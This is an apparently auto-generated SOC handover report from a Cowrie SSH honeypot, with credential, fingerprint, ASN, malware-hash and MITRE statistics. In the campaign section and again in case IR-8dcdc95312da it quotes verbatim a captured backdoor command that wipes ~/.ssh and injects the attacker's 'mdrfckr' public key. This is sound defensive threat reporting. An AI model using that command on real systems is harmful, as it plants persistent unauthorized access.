# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-12 |
| **Generated At** | 2026-05-12T06:40:43Z |
| **Shift Time** | 06:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **873** |
| Confirmed Threats | **568** |
| False Positives Filtered | **305** (34.9%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **17** |
| High Severity Cases | **2** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **871** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **8** |
| Unique Credential Pairs | **8** |
| Unique Usernames | **5** |
| Unique Passwords | **8** |
| Successful Auth Pairs | **2** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 3 |
| `root` | 2 |
| `postgres` | 1 |
| `user` | 1 |
| `test` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `888888` | 1 |
| `123456@` | 1 |
| `admin2022.` | 1 |
| `3245gs5662d34` | 1 |
| `abc@1234` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `postgres` | `888888` | 1 |
| `ubuntu` | `123456@` | 1 |
| `root` | `admin2022.` | 1 |
| `root` | `3245gs5662d34` | 1 |
| `ubuntu` | `abc@1234` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin2022.` | `119.96.82.192` | 2026-05-12T06:29:59 |
| `root` | `3245gs5662d34` | `119.96.82.192` | 2026-05-12T06:30:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **873** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 35 | 4 |
| `af8223ac9914...` | libssh-based | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 35 | 4 | Modern SSH client |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `119.96.82.192`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **28** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS6057` | Administracion Nacional de Telecomunicaciones | 2 | LOW |
| `AS7922` | Comcast Cable Communications, LLC | 1 | HIGH |
| `AS577` | Bell Canada | 1 | HIGH |
| `AS52711` | FASTNET TELECOM | 1 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | LOW |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS28533` | Mexico Red de Telecomunicaciones, S. de R.L. de C.V. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8dcdc95312da

| Field | Detail |
|---|---|
| **Source IP** | `119.96.82[.]192` |
| **First Seen** | 2026-05-12 06:29 |
| **Last Seen** | 2026-05-12 06:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 06:29:58` | `cowrie.session.connect` |
| `2026-05-12 06:29:58` | `cowrie.client.version` |
| `2026-05-12 06:29:58` | `cowrie.client.kex` |
| `2026-05-12 06:29:59` | `cowrie.login.success` |
| `2026-05-12 06:29:59` | `cowrie.session.params` |
| `2026-05-12 06:29:59` | `cowrie.command.input` |
| `2026-05-12 06:29:59` | `cowrie.command.failed` |
| `2026-05-12 06:29:59` | `cowrie.log.closed` |
| `2026-05-12 06:30:00` | `cowrie.session.params` |
| `2026-05-12 06:30:00` | `cowrie.command.input` |
| `2026-05-12 06:30:00` | `cowrie.session.file_download` |
| `2026-05-12 06:30:00` | `cowrie.log.closed` |
| `2026-05-12 06:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.82[.]192` to AbuseIPDB if not already reported
- [ ] Block `119.96.82[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e1551ad9f7

| Field | Detail |
|---|---|
| **Source IP** | `119.96.82[.]192` |
| **First Seen** | 2026-05-12 06:30 |
| **Last Seen** | 2026-05-12 06:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 06:30:06` | `cowrie.session.connect` |
| `2026-05-12 06:30:06` | `cowrie.client.version` |
| `2026-05-12 06:30:06` | `cowrie.client.kex` |
| `2026-05-12 06:30:07` | `cowrie.login.success` |
| `2026-05-12 06:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.82[.]192` to AbuseIPDB if not already reported
- [ ] Block `119.96.82[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.100[.]71` | **473** | 2026-05-12 03:35 | 2026-05-12 06:39 | 272m | 0 | `T1592` | 🟠 MEDIUM |
| `119.96.82[.]192` | **30** | 2026-05-12 06:21 | 2026-05-12 06:39 | 40m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.135.40[.]68` | **25** | 2026-05-12 04:54 | 2026-05-12 04:59 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `112.248.30[.]51` | **22** | 2026-05-12 05:07 | 2026-05-12 05:12 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `135.148.14[.]151` | **3** | 2026-05-12 03:44 | 2026-05-12 04:15 | 1m | 0 | `T1592` | 🟢 LOW |
| `52.180.137[.]70` | **2** | 2026-05-12 03:59 | 2026-05-12 03:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `9.234.10[.]188` | **2** | 2026-05-12 04:08 | 2026-05-12 04:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.91.186[.]55` | 1 | 2026-05-12 06:22 | 2026-05-12 06:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `179.96.190[.]108` | 1 | 2026-05-12 06:32 | 2026-05-12 06:32 | 31s | 0 | `T1592` | 🟢 LOW |
| `183.250.89[.]44` | 1 | 2026-05-12 06:35 | 2026-05-12 06:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.199.63[.]29` | 1 | 2026-05-12 05:22 | 2026-05-12 05:23 | 30s | 0 | `T1592` | 🟢 LOW |
| `42.51.33[.]162` | 1 | 2026-05-12 04:06 | 2026-05-12 04:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `70.54.182[.]130` | 1 | 2026-05-12 06:31 | 2026-05-12 06:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `73.203.251[.]98` | 1 | 2026-05-12 06:04 | 2026-05-12 06:06 | 112s | 0 | `T1592` | 🟢 LOW |
| `79.143.42[.]170` | 1 | 2026-05-12 06:21 | 2026-05-12 06:21 | 31s | 0 | `T1592` | 🟢 LOW |
| `91.218.194[.]97` | 1 | 2026-05-12 04:43 | 2026-05-12 04:44 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `9.234.10[.]188` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `139.135.40[.]68` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 7 |
| `135.148.14[.]151` | US | Chirag, Patel | **100** ⚠️ | 3 |
| `213.199.63[.]29` | FR | Contabo GmbH | **100** ⚠️ | 2 |
| `183.250.89[.]44` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `119.96.82[.]192` | CN | CHINANET Hubei province network | **100** ⚠️ | 19 |
| `73.203.251[.]98` | US | Comcast IP Services, L.L.C. | **100** ⚠️ | 1 |
| `79.143.42[.]170` | UA | Telecommunication Company Vinteleport Ltd. | **100** ⚠️ | 50 |
| `70.54.182[.]130` | CA | Bell Canada | **100** ⚠️ | 50 |
| `52.180.137[.]70` | US | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 38 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |

---

## 🔕 False Positive Summary (305 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 292 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 873 cases |
| Tool 34  | Credential Extractor        | ✅ 8 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 305 filtered (34.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 16 recon entry/entries in table (7 group(s) consolidating 557 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-12T06:40:43Z_
